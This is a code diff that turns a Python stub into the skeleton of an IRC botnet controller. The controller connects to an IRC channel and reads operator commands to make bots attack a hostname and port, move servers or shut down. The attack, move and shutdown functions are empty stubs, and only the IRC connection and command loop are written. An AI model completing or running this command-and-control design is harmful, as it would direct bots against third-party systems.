@@ -1,41 +1,153 @@
 import time
+import socket
+import sys
+import random
 
+ERROR_FLAG = -1
+
+#connection info
+irc = ""
+channel = "#"
+con_active = False
+
+#controller info
 nick = "controller"
+atk_cnt = 0
+active = True
 
 #send a command to the bots
-def send_command:
-	continue
+def send_command():
+	return
 
+
+
+#ids bots and prints out numbers
+def status():
+	return
+
+#tells the bots to attack the hostname
+def attack(hostname, port):
+	#send a message containing  a counter and the nick of the bot
+	#on next attack increase the counter
+	#bots send a message back to controller telling if success or not  
+	return
+
+
+
+#move bots from current irc to new irc
+def move(hostname, port, channel):
+	#instructs bots to disconnect from current irc and move to another one
+	return
+
+#controller will disconnect from the bots and terminate
+def quit():	
+	return
+
+#this kills the bot(s)
+def shutdown():
+	return
+
+#wait for a user to send command to the irc needs error checking
+def get_command():
+	msg = input("command> ")
+	cmd = msg.split()
+	return cmd
+
+
+#send as bytes TO DO
+def send(msg):
+	global con_active
+	#try:
+	irc.send(msg.encode('UTF-8'))
+	#except someerror:
+		#con_active = False
+	return
 
 #connect to the specified IRC server and channel
-def connect():
-	continue
+def connect(host, port):
+	global nick, irc, con_active
+	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	try:
+		irc.connect((host,port))
+		con_active = True
+		print("connection made")
+	except ConnectionRefusedError:
+		print("Error: Could not make connection")
+		return ERROR_FLAG
+		
+	send("USER " + nick + " " + nick + " " + nick + ": This controller is connecting\n") 
+	send("NICK " + nick + "\n")
+	send("JOIN " + channel + "\n")
+
+	return 
+
+#handle the connection to the IRC server
+def handle_connection():
+	#TO DO Verify controller
 	
+	while active:
 	
+		#wait for commands
+		cmd = get_command()
+	
+		#interpret command
+		if cmd[0] == 'status':
+			status()
+		elif cmd[0] == "attack":
+			attack(cmd[1],cmd[2])
+		elif cmd[0] == "move":
+			move(cmd[1], cmd[2], cmd[3]) 
+		elif cmd[0] == "quit":
+			quit() 
+		elif cmd[0] == "shutdown":
+			shutdown()
+		elif con_active == False:
+			break
+		else:
+			print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
+	
+	return
+
 #main
 def main():
-
+	global channel, secret_phrase
 	hostname = ""
 	port = 0
-	channel = ""
 	secret_phrase = ""
 	
 	#ensure correct number of commands
 	if len(sys.argv) != 5:
-		print("incorrect number of command line arguments. Command is...")
-		print("\tconbot.py <hostname> <port> <channel> <secret-phrase>")
+		print("Error: Incorrect number of command line arguments. Command is...")
+		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
 		return
 		
 	#ensure port is a number
-	if !isdigit(sys.argv[2]):
-		print("Command argument 2 could not be processed. Command is...")
-		print("\tconbot.py <hostname> <port> <channel> <secret-phrase>")
+	if not sys.argv[2].isdigit():
+		print("Error: Command argument 2 could not be processed. Command is...")
+		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
 		return
 		
 	#extract arguments from command line
 	hostname = sys.argv[1]
 	port = int(sys.argv[2])
-	channel = sys.argv[3]
+	channel = channel + sys.argv[3]
 	secret_phrase = sys.argv[4]
+	
+	#loop to keep trying to connect to irc when not shutdown
+	while True:
+		#connect to the IRC server
+		status = connect(hostname, port)
+		
+		if status != ERROR_FLAG:
+			#handle the connection
+			handle_connection()
+		#if handle_connection exited without shutdown command
+		if active == True:
+			#wait 5 seconds before retrying connection
+			time.sleep(5)
+		else:
+			break
+
+	return
 
 main()
